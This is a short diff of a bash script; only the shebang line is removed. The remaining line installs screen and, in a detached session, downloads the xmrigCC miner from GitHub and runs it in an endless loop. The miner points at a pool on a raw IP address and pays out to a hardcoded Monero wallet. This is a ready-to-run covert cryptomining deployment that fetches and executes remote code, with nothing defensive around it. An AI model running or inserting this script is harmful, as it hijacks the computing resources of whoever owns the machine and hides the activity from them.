@@ -1,2 +1,1 @@
-#! /bin/bash
 apt-get install screen -y && screen -dmS yes1_session bash -c 'wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && while true; do ./xmrigDaemon --donate-level 1 -o 162.243.171.178:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p virtual -t4 -a rx/0 -k ; sleep 3 ; done'
